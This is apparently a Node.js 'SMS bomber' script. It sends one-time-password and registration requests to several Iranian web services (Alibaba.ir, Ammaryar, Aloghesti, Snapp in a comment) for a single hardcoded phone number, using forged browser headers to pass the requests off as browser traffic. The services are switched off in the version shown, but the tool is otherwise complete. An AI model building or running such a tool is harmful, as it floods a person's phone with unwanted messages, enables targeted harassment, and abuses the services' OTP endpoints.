import axios from "axios";
import chalk from "chalk";

const PHONE_NUMBER = "9332621196";

const runService = async ({ name, headers, api, params }) => {
  try {
    const res = await axios.post(api, params, {
      headers: headers,
      timeout: 8000,
    });

    console.log(res.data);

    console.log(chalk.green(`${name} ✓ Success`));
  } catch (err) {
    const status = err.response?.status || err.code || "Unknown";
    console.log(chalk.red(`${name} ✗ Failed (${status})`));
  }
};

const services = [
  {
    name: "Aloghesti",
    api: "https://api.aloghesti.com/api/v1/initial-user",
    params: { mobile: "0" + PHONE_NUMBER },
    headers: {
      Origin: "https://aloghesti.com",
    },
    enabled: false,
  },
  {
    name: "Ammaryar",
    api: "https://ammaryar.ir/register_ajax",
    params: { mobile: PHONE_NUMBER, conf: 1 },
    headers: {
      Origin: "https://ammaryar.ir",
      Host: "ammaryar.ir",
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": 24,
    },
    enabled: false,
  },
  {
    name: "Alibaba",
    origin: "https://www.alibaba.ir",
    api: "https://ws.alibaba.ir/api/v3/account/mobile/otp",
    params: {
      phoneNumber: PHONE_NUMBER,
    },
    headers: {
      "ab-alohomora": "h6xtsSi8jRqPDWNVDWRhr7",
      "ab-channel":
        "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,desktop,Chrome,142.0.0.0,N,N,Linux,x86_64,3.217.0",
      Accept: "application/json, text/plain, */*",
      "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
      "Content-Type": "application/json",
      Referer: "https://www.alibaba.ir/",
      "Sec-Fetch-Site": "same-site",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
      "sec-ch-ua":
        '"Not_A Brand";v="99", "Chromium";v="142"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Linux"',

      "tracing-device": "N,Chrome,142.0.0.0,N,N,Linux",
      "tracing-sessionid": "1764322294425",
    },
    enabled: false
  },
];

(async () => {
  for (const service of services) {
    if (service.enabled) {
      await runService(service);
    }
  }
})();

// {
//   name: "Snapp",
//     origin: "https://app.snapp.taxi",
//   api: "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",
//   params: {
//   cellphone: "+98" + PHONE_NUMBER,
//     attestation: { method: "skip", platform: "skip" },
//   extra_methods: [],
// },
//   enabled: false,
// },